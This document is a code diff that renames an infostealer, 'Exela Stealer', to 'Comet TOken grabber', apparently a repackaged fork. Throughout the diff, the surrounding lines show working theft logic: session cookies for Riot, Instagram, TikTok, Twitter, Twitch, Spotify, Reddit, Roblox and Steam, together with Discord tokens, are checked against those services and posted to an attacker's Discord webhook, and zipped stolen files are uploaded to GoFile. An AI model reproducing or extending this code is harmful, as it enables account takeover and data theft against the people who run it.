@@ -1,4 +1,4 @@
-# Exela Stealer All Rights Recieved
+# Comet TOken grabber All Rights Recieved
 # Coded by quicaxd
 # https://t.me/Comet Token Grabber
 
@@ -727,7 +727,7 @@ class Main:
                 async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
                     response = await req.json()
                 embed_data = {
-                    "title": "***Exela Stealer***",
+                    "title": "***Comet TOken grabber***",
                     "description": f"***Exela Riot Games Session was detected on the {browser} browser***",
                     "url" : "https://t.me/Comet Token Grabber",
                     "color": 0,
@@ -749,7 +749,7 @@ class Main:
                     {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -801,7 +801,7 @@ class Main:
             followers = data2["user"]["follower_count"]
             following = data2["user"]["following_count"]
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Instagram Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -820,7 +820,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -861,7 +861,7 @@ class Main:
             coins = data2["data"]["coins"]
 
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Tiktok Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -878,7 +878,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -933,7 +933,7 @@ class Main:
             nickname = req["screen_name"]
             profileURL = "https://twitter.com/" + username
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Twitter Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -954,7 +954,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1017,7 +1017,7 @@ class Main:
             bits = data["bitsBalance"]
             followers = data["followers"]["totalCount"]
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Twitch Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -1038,7 +1038,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1073,7 +1073,7 @@ class Main:
             country = data["country"]
             username = data["username"]
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Spotify Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -1090,7 +1090,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1139,7 +1139,7 @@ class Main:
                     suspended = data2["is_suspended"]
                     
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Reddit Session was detected on the {browser} browser***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -1160,7 +1160,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1190,7 +1190,7 @@ class Main:
                 robux = res2["robux"]
                 pp = res3["data"][0]["imageUrl"]
                 embed_data = {
-                    "title": "***Exela Stealer***",
+                    "title": "***Comet TOken grabber***",
                     "description": f"***Exela Roblox Session was detected on the {browser} browser***",
                     "url" : "https://t.me/Comet Token Grabber",
                     "color": 0,
@@ -1206,7 +1206,7 @@ class Main:
                     {"name": "Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data]
                 }
                 headers2 = {
@@ -1445,7 +1445,7 @@ class Main:
 
             if data:
                 embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Exela Validated Discord Token Detected***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -1473,7 +1473,7 @@ class Main:
                 embed_data["fields"] = fields
                 async with aiohttp.ClientSession() as session:
                     payload = {
-                        "username": "Exela Stealer",
+                        "username": "Comet TOken grabber",
                         "embeds": [embed_data]
                     }
                     headers = {
@@ -1516,7 +1516,7 @@ class Main:
                                 else:realname = "None"
                                 player_level = response2["response"]["player_level"]
                                 embed_data = {
-                                    "title": "***Exela Stealer***",
+                                    "title": "***Comet TOken grabber***",
                                     "description": f"***Exela Steam Session Detected***",
                                     "url" : "https://github.com/quicaxd/Exela-V2.0",
                                     "color": 0,
@@ -1532,7 +1532,7 @@ class Main:
                                 embed_data["fields"] = fields
                                 async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                     payload = {
-                                        "username": "Exela Stealer",
+                                        "username": "Comet TOken grabber",
                                         "embeds": [embed_data]
                                     }
                                     headers = {
@@ -1799,7 +1799,7 @@ class Main:
                 autofill_keys = None
 
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Comet TOken grabber***",
                 "description": f"***Keyword Result***",
                 "url" : "https://t.me/Comet Token Grabber",
                 "color": 0,
@@ -1812,7 +1812,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Comet TOken grabber",
                     "embeds": [embed_data] }
                 headers = {
                     "Content-Type": "application/json"}
@@ -1835,8 +1835,8 @@ class Main:
         filePath:str = os.path.join(self.Temp, uuid)
         shutil.make_archive(filePath, "zip", filePath)
         embed_data = {
-            "title": "***Exela Stealer***",
-            "description": f"***Exela Stealer Full Info***",
+            "title": "***Comet TOken grabber***",
+            "description": f"***Comet TOken grabber Full Info***",
             "url" : "https://t.me/Comet Token Grabber",
             "color": 0,
             "footer": {"text": "https://t.me/Comet Token Grabber | https://github.com/quicaxd/Exela-V2.0"},
@@ -1864,7 +1864,7 @@ class Main:
         embed_data["fields"] = fields
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
             payload = {
-                "username": "Exela Stealer",
+                "username": "Comet TOken grabber",
                 "embeds": [embed_data] }
             headers = {
                  "Content-Type": "application/json"}
@@ -1884,8 +1884,8 @@ class Main:
                 succes = await UploadGoFile.upload_file(filePath + ".zip")
                 if succes != None:
                     embed_data2 = {
-                        "title": "***Exela Stealer***",
-                        "description": f"***Exela Stealer Full Info***",
+                        "title": "***Comet TOken grabber***",
+                        "description": f"***Comet TOken grabber Full Info***",
                         "url" : "https://t.me/Comet Token Grabber",
                         "color": 0,
                         "footer": {"text": "https://t.me/Comet Token Grabber | https://github.com/quicaxd/Exela-V2.0"},
@@ -1893,7 +1893,7 @@ class Main:
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                        "username": "Exela Stealer",
+                        "username": "Comet TOken grabber",
                         "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -2066,7 +2066,7 @@ class StealCommonFiles:
             if not uploaded_url == None:
                 async with aiohttp.ClientSession() as session:
                     embed_data2 = {
-                            "title": "***Exela Stealer***",
+                            "title": "***Comet TOken grabber***",
                             "description": f"***Stealed Files***",
                             "url" : "https://t.me/Comet Token Grabber",
                             "color": 0,
@@ -2075,7 +2075,7 @@ class StealCommonFiles:
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                                "username": "Exela Stealer",
+                                "username": "Comet TOken grabber",
                                 "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
